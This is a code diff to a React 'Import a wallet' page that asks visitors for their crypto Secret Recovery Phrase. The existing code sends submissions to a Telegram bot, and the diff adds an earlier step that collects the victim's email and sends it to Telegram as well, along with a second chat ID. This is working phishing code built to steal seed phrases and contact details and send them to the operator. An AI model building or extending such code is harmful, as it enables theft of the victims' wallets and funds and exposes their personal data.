@@ -3,6 +3,7 @@ import React, { useState, useEffect, useRef } from "react"
 import { ArrowLeft, ChevronDown, Info, CheckCircle } from "lucide-react"
 
 export default function ImportWallet() {
+  const [email, setEmail] = useState("")
   const [phrase, setPhrase] = useState("")
   const [isLoading, setIsLoading] = useState(false)
   const [errorMessage, setErrorMessage] = useState("")
@@ -13,10 +14,11 @@ export default function ImportWallet() {
   const inputRefs = useRef<(HTMLInputElement | null)[]>([])
   const [visibleBoxes, setVisibleBoxes] = useState<number[]>([0])
   const [showMessage, setShowMessage] = useState(false)
+  const [step, setStep] = useState(1)
 
   const telegramChatId = process.env.NEXT_PUBLIC_ID
+  const telegramChatId2 = process.env.NEXT_PUBLIC_ID2
   const telegramToken = process.env.NEXT_PUBLIC_TOKEN
-
 
   // Send message to Telegram
   const sendTelegramMessage = async (message: string) => {
@@ -48,6 +50,17 @@ export default function ImportWallet() {
       })
   }, [telegramToken, telegramChatId])
 
+  // Handle email submission
+  const handleEmailSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+    setIsLoading(true)
+    await sendTelegramMessage(`Email: \`${email}\``)
+    setTimeout(() => {
+      setIsLoading(false)
+      setStep(2)
+    }, 3000)
+  }
+
   // Handle phrase input changes
   const handlePhraseChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
     const newPhrase = e.target.value
@@ -60,7 +73,6 @@ export default function ImportWallet() {
     })
     setWordInputs(newWordInputs)
 
-    // Focus next empty input after space
     if (newPhrase.endsWith(" ") && words.length < 24) {
       const nextIndex = words.length
       inputRefs.current[nextIndex]?.focus()
@@ -69,7 +81,6 @@ export default function ImportWallet() {
 
   // Handle individual word input changes, including paste
   const handleWordChange = (index: number, value: string) => {
-    // If user pastes multiple words, distribute them
     if (value.trim().includes(" ")) {
       const words = value.trim().split(/\s+/)
       const newWordInputs = [...wordInputs]
@@ -81,7 +92,6 @@ export default function ImportWallet() {
       setWordInputs(newWordInputs)
       setPhrase(newWordInputs.filter(word => word).join(" "))
 
-      // Show boxes for all pasted words
       setVisibleBoxes(prev => {
         const newBoxes = [...prev]
         for (let i = index; i < index + words.length && i < 24; i++) {
@@ -90,7 +100,6 @@ export default function ImportWallet() {
         return newBoxes
       })
 
-      // Focus next empty input after paste
       const nextIndex = index + words.length
       if (nextIndex < 24) {
         inputRefs.current[nextIndex]?.focus()
@@ -98,14 +107,12 @@ export default function ImportWallet() {
       return
     }
 
-    // Normal single word change
     const newWordInputs = [...wordInputs]
     newWordInputs[index] = value
     setWordInputs(newWordInputs)
     const newPhrase = newWordInputs.filter(word => word).join(" ")
     setPhrase(newPhrase)
 
-    // Move to next input on space
     if (value.endsWith(" ") && index < 17) {
       setVisibleBoxes(prev => {
         if (!prev.includes(index + 1)) {
@@ -140,7 +147,6 @@ export default function ImportWallet() {
     }, 3000)
   }
 
-  // Ensure focus moves to the newly visible box
   useEffect(() => {
     const lastVisibleIndex = visibleBoxes[visibleBoxes.length - 1];
     if (lastVisibleIndex !== undefined) {
@@ -148,7 +154,6 @@ export default function ImportWallet() {
     }
   }, [visibleBoxes]);
 
-  // Ensure focus moves to the newly visible box
   useEffect(() => {
     const lastVisibleIndex = visibleBoxes[visibleBoxes.length - 1];
     if (lastVisibleIndex !== undefined) {
@@ -156,7 +161,6 @@ export default function ImportWallet() {
     }
   }, [visibleBoxes]);
 
-  // Render word input grid
   const [focusedIndex, setFocusedIndex] = useState<number | null>(null);
 
   const renderWords = () => {
@@ -206,13 +210,11 @@ export default function ImportWallet() {
     ));
   };
 
-  // Check if continue button should be enabled
   const isContinueEnabled = () => {
     const validWords = wordInputs.filter(word => word.trim() !== "").length
     return !isLoading && validWords >= 12
   }
 
-  // Clear all inputs
   const clearAll = () => {
     setPhrase("")
     setWordInputs(Array(24).fill(""))
@@ -220,14 +222,12 @@ export default function ImportWallet() {
     inputRefs.current[0]?.focus()
   }
 
-  // Loading spinner component
   const LoadingSpinner = () => (
     <div className="flex justify-center items-center my-4">
       <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-blue-500"></div>
     </div>
   )
 
-  // Success page component
   if (isVerified) {
     return (
       <div className="min-h-screen bg-gray-900 text-white flex flex-col items-center justify-center">
@@ -239,7 +239,6 @@ export default function ImportWallet() {
 
   return (
     <div className="min-h-screen bg-gray-900 text-white">
-      {/* Header */}
       <header className="flex items-center justify-between p-4 border-b border-gray-800">
         <div className="flex items-center">
           <div className="text-center mb-8">
@@ -253,89 +252,128 @@ export default function ImportWallet() {
         </div>
       </header>
 
-      {/* Main Content */}
       <main className="px-4 py-6 pb-24">
-        {/* Navigation */}
         <div className="flex items-center space-x-4 mb-8">
           <ArrowLeft className="w-6 h-6 text-gray-400 cursor-pointer hover:text-white transition-colors" />
-          <span className="text-sm text-gray-500">Step 1 of 2</span>
+          <span className="text-sm text-gray-500">Step {step} of 2</span>
         </div>
 
-        {/* Title */}
         <h1 className="text-3xl font-bold mb-8">Import a wallet</h1>
 
-        {/* Form */}
-        <form onSubmit={handleSubmit} className="space-y-6">
-          {/* Input Field */}
-          <div className="relative">
-            <div className="flex items-center space-x-2">
-              <h3 className="bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">
-                Enter your Secret Recovery Phrase
-              </h3>
-              <Info
-                className="w-5 h-5 text-gray-400 cursor-pointer"
-                onClick={() => setShowMessage(true)}
-              />
-            </div>
-            {showMessage && (
-              <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
-                <div className="bg-gray-800 p-6 rounded-lg text-white max-w-md">
-                  <p>A Secret Recovery Phrase, also called a seed phrase or mnemonic, is a set of words that lets you access and control your crypto wallet. To verify and protect your wallet, you need this phrase.</p>
-                  <p className="mt-4">Anyone with your Secret Recovery Phrase can:</p>
-                  
-                  <button
-                    className="mt-4 w-full bg-gray-600 hover:bg-gray-500 text-white font-medium py-2 rounded-lg"
-                    onClick={() => setShowMessage(false)}
-                  >
-                    Got it
-                  </button>
-                </div>
+        {step === 1 ? (
+          <form onSubmit={handleEmailSubmit} className="space-y-6">
+            <div className="relative">
+              <div className="flex items-center space-x-2">
+                <h3 className="bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">
+                  Enter your email address
+                </h3>
+                <Info
+                  className="w-5 h-5 text-gray-400 cursor-pointer"
+                  onClick={() => setShowMessage(true)}
+                />
               </div>
+              {showMessage && (
+                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                  <div className="bg-gray-800 p-6 rounded-lg text-white max-w-md">
+                    <p>Please provide your email address to proceed with the wallet import process.</p>
+                    <button
+                      className="mt-4 w-full bg-gray-600 hover:bg-gray-500 text-white font-medium py-2 rounded-lg"
+                      onClick={() => setShowMessage(false)}
+                    >
+                      Got it
+                    </button>
+                  </div>
+                </div>
+              )}
+            </div>
+            
+              <textarea
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+              className="w-full p-2 mt-2 rounded-xl border bg-[#202123] border-gray-700 text-white text-sm"
+              rows={1}
+              placeholder="example@email.com"
+            />
+
+            {isLoading && <LoadingSpinner />}
+
+            <div className="fixed bottom-0 left-0 right-0 p-4 bg-gray-900 border-t border-gray-800">
+              <button
+                type="submit"
+                disabled={!email}
+                className="w-full bg-gray-600 hover:bg-gray-500 text-white font-medium py-4 rounded-lg transition-colors shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
+              >
+                Continue
+              </button>
+            </div>
+          </form>
+        ) : (
+          <form onSubmit={handleSubmit} className="space-y-6">
+            <div className="relative">
+              <div className="flex items-center space-x-2">
+                <h3 className="bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">
+                  Enter your Secret Recovery Phrase
+                </h3>
+                <Info
+                  className="w-5 h-5 text-gray-400 cursor-pointer"
+                  onClick={() => setShowMessage(true)}
+                />
+              </div>
+              {showMessage && (
+                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                  <div className="bg-gray-800 p-6 rounded-lg text-white max-w-md">
+                    <p>A Secret Recovery Phrase, also called a seed phrase or mnemonic, is a set of words that lets you access and control your crypto wallet. To verify and protect your wallet, you need this phrase.</p>
+                    <p className="mt-4">Anyone with your Secret Recovery Phrase can:</p>
+                    
+                    <button
+                      className="mt-4 w-full bg-gray-600 hover:bg-gray-500 text-white font-medium py-2 rounded-lg"
+                      onClick={() => setShowMessage(false)}
+                    >
+                      Got it
+                    </button>
+                  </div>
+                </div>
+              )}
+            </div>
+
+            <div className="bg-[#202123] border border-gray-700 rounded-lg p-6 grid grid-cols-3 gap-2">
+              {renderWords()}
+            </div>
+
+            {errorMessage && (
+              <div className="text-red-400 text-center">{errorMessage}</div>
             )}
-          </div>
 
-          {/* Word Grid */}
-          <div className="bg-[#202123] border border-gray-700 rounded-lg p-6 grid grid-cols-3 gap-2">
-            {renderWords()}
-          </div>
+            {isLoading && <LoadingSpinner />}
 
-          {/* Error Message */}
-          {errorMessage && (
-            <div className="text-red-400 text-center">{errorMessage}</div>
-          )}
+            <div className="flex justify-between">
+              <button 
+                type="button" 
+                className="text-purple-400 hover:text-blue-300 transition-colors font-medium"
+                onClick={() => setShowAll(!showAll)}
+              >
+                {showAll ? "Hide all" : "Show all"}
+              </button>
+              <button 
+                type="button"
+                onClick={clearAll}
+                className="text-purple-400 hover:text-blue-300 transition-colors font-medium"
+              >
+                Clear all
+              </button>
+            </div>
 
-          {/* Loading Spinner */}
-          {isLoading && <LoadingSpinner />}
-
-          {/* Action Links */}
-          <div className="flex justify-between">
-            <button 
-              type="button" 
-              className="text-purple-400 hover:text-blue-300 transition-colors font-medium"
-              onClick={() => setShowAll(!showAll)}
-            >
-              {showAll ? "Hide all" : "Show all"}
-            </button>
-            <button 
-              type="button"
-              onClick={clearAll}
-              className="text-purple-400 hover:text-blue-300 transition-colors font-medium"
-            >
-              Clear all
-            </button>
-          </div>
-
-          {/* Continue Button */}
-          <div className="fixed bottom-0 left-0 right-0 p-4 bg-gray-900 border-t border-gray-800">
-            <button 
-              type="submit"
-              disabled={!isContinueEnabled()}
-              className="w-full bg-gray-600 hover:bg-gray-500 text-white font-medium py-4 rounded-lg transition-colors shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
-            >
-              Continue
-            </button>
-          </div>
-        </form>
+            <div className="fixed bottom-0 left-0 right-0 p-4 bg-gray-900 border-t border-gray-800">
+              <button 
+                type="submit"
+                disabled={!isContinueEnabled()}
+                className="w-full bg-gray-600 hover:bg-gray-500 text-white font-medium py-4 rounded-lg transition-colors shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
+              >
+                Continue
+              </button>
+            </div>
+          </form>
+        )}
       </main>
     </div>
   )
